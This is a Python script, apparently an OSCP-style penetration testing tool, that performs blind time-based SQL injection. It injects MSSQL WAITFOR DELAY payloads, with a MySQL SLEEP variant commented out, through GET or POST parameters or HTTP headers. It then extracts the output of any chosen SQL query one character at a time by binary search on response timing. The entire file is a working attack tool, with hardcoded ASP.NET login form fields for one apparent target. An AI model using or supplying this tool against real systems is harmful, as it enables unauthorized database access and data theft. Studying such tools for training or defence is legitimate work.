import requests
import argparse
import sys
import time

# USAGE:
# python3 sql_time.py -u "http://127.0.0.1:3000/user" -t get -p "id" --prefix "1" -c "user()"
# python3 sql_time.py -u "http://127.0.0.1:3000/search" -t post -p "search" --prefix "admin'" --suffix " -- -" -c "user()"
# python3 sql_time.py -u "http://127.0.0.1:3000/dashboard" -t header -p "Cookie" --prefix "tracking_id=1'" --suffix " -- -" -c "user()"

# --- Configuration Constants ---
SLEEP_TIME = 2  # Seconds for the DB to sleep
THRESHOLD = 1.8 # Seconds to qualify as a "True" result

def make_request(args, payload):
    # Time-based payload logic: 
    # IF(condition, SLEEP(N), 1)
    # Note: We wrap the sleep inside the injection string
    time_logic = f" IF ({payload}) WAITFOR DELAY '0:0:{SLEEP_TIME}'"  # f" AND IF(({payload}), SLEEP({SLEEP_TIME}), 1)" - MYSQL syntax
    injection = f"{args.prefix}{time_logic}{args.suffix}"
    
    try:
        start_time = time.time()
        
        if args.type == "get":
            r = requests.get(args.url, params={args.parameter: injection}, timeout=10)
            
        elif args.type == "post":
            data = {
                "__VIEWSTATE": "/wEPDwUKMjA3MTgxMTM4N2RkL7UlJbQLRVEHtdBd2cHsgmzduFNoWHiXrVGu0cD9+jc=",
                "__VIEWSTATEGENERATOR": "C2EE9ABB",
                "__EVENTVALIDATION": "/wEdAATHRQHJ3fxgbABeqXLtYnwsG8sL8VA5/m7gZ949JdB2tEE+RwHRw9AX2/IZO4gVaaKVeG6rrLts0M7XT7lmdcb6vZhOhYNI15ms6KxT68HdWaGxCBK67o39S7upoRJaNfM=",
                args.parameter: injection, # ctl00$ContentPlaceHolder1$UsernameTextBox
                "ctl00$ContentPlaceHolder1$PasswordTextBox": "password",
                "ctl00$ContentPlaceHolder1$LoginButton": "Login"
           }
            # r = requests.post(args.url, json={args.parameter: injection}, timeout=10)
            # Use 'data=' for x-www-form-urlencoded
            r = requests.post(args.url, data=data, timeout=15)
        elif args.type == "header":
            r = requests.get(args.url, headers={args.parameter: injection}, timeout=10)
        
        duration = time.time() - start_time
        
        # If the request took longer than the threshold, the condition was TRUE
        return duration >= THRESHOLD

    except requests.exceptions.Timeout:
        # A timeout is almost always a TRUE in time-based attacks
        return True
    except Exception as e:
        print(f"\n[!] Connection error: {e}")
        sys.exit(1)

def extract_data(args):
    print(f"[*] Target: {args.url}")
    print(f"[*] Mode: {args.type.upper()} | Parameter: {args.parameter}")
    print(f"[*] Sleep Interval: {SLEEP_TIME}s | Threshold: {THRESHOLD}s")
    
    result = ""
    char_pos = 1
    
    while True:
        low, high = 32, 126
        found_at_this_pos = False
        
        while low <= high:
            mid = (low + high) // 2
            # The logic core remains the same, but evaluated by time
            payload = f"ascii(substring(({args.command}),{char_pos},1)) > {mid}"
            
            if make_request(args, payload):
                low = mid + 1
                found_at_this_pos = True
            else:
                high = mid - 1
        
        if not found_at_this_pos:
            break
            
        result += chr(low)
        sys.stdout.write(f"\r[!] Extracted: {result}")
        sys.stdout.flush()
        char_pos += 1
        
    return result

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Universal OSCP Time-Based SQLi Tool")
    parser.add_argument("-u", "--url", required=True, help="Target URL")
    parser.add_argument("-t", "--type", choices=['get', 'post', 'header'], required=True, help="Injection type")
    parser.add_argument("-p", "--parameter", required=True, help="Vulnerable param/header name")
    parser.add_argument("-c", "--command", required=True, help="SQL to execute")
    parser.add_argument("--prefix", default="1", help="Injection prefix (e.g. admin')")
    parser.add_argument("--suffix", default="", help="Injection suffix (e.g. # or -- -)")
    
    args = parser.parse_args()
    
    print("\n--- Blind Time-Based SQLi Extractor ---")
    final_output = extract_data(args)
    
    if final_output:
        print(f"\n\n[SUCCESS] Result: {final_output}")
    else:
        print("\n\n[FAILURE] No data found. Check your prefix/suffix or network lag.")
